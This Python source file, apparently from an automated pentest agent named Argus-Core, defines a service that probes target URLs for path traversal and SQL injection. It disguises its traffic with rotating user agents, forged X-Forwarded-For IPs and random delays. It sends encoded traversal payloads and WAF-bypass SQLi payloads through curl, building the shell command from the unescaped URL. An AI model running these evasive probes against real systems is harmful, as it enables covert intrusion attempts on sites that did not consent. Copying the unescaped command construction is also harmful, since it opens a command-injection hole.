import random
import time

from app.tools.utils import normalize_domain_for_memory

class EvasionService:
    """Performs targeted, WAF-evasive probes for SQLi and Path Traversal."""

    def __init__(self, runner, memory):
        self.runner = runner
        self.memory = memory
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.98 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36"
        ]

    def _get_stealth_headers(self):
        ua = random.choice(self.user_agents)
        ip = f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"
        return f"-H 'User-Agent: {ua}' -H 'X-Forwarded-For: {ip}'"

    def stealth_run(self, command, delay=True, timeout=20):
        """Executes a command (typically curl) with stealth headers and optional delay.

        `timeout` defaults to 20s (not command_runner's generic 180s) because
        every caller here is a single curl probe, not a full tool scan - six
        of these run sequentially in advanced_vuln_probe(), so a generous
        per-call timeout can stack up to consume the whole exploit-node
        budget (scripts/run_agent.py's AGENT_TIMEOUT_SECONDS) on its own.
        """
        if delay:
            time.sleep(random.uniform(1, 3))

        if "curl " in command:
            headers = self._get_stealth_headers()
            command = command.replace("curl ", f"curl {headers} ")

        return self.runner.run(command, timeout=timeout)

    def advanced_vuln_probe(self, url):
        """Performs targeted, WAF-evasive probes for SQLi and Path Traversal."""
        print(f"[*] [Argus-Core] Starting Advanced Evasion Probes for: {url}")
        results = []
        clean_target = normalize_domain_for_memory(url)

        # 1. Path Traversal Evasion
        # --max-time/--connect-timeout let curl itself enforce the bound
        # (more reliable than only relying on the outer process being
        # killed - see command_runner.py's own timeout handling).
        traversal_payloads = ["web.config", "..%2f..%2fweb.config", "..%5c..%5cweb.config"]
        for p in traversal_payloads:
            cmd = f"curl -s --max-time 15 --connect-timeout 5 -o /dev/null -w '%{{http_code}} %{{size_download}}' '{url}?item={p}'"
            res = self.stealth_run(cmd)
            if res.startswith('200'):
                results.append(f"[!] Path Traversal Success: {p}")
                self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"Traversal: {p}", "Path Traversal Bypass!")

        # 2. SQLi WAF Evasion
        sqli_payloads = ["%u0027", "1'/**/OR/**/1=1/**/--", "1%20OR%201=1"]
        for p in sqli_payloads:
            cmd = f"curl -s --max-time 15 --connect-timeout 5 -o /dev/null -w '%{{http_code}}' '{url}?id={p}'"
            res = self.stealth_run(cmd)
            if res == "500":
                results.append(f"[!] Potential SQLi (Evasion): {p} (Server Error 500)")
                self.memory.add_finding(clean_target, "evasion_probe", "vulnerability", f"SQLi: {p}", "SQLi potential via WAF evasion")

        if not results:
            return "No vulnerabilities detected with advanced evasion probes."
        
        return "--- [SHIELD] ADVANCED EVASION PROBE REPORT ---\n" + "\n".join(results)
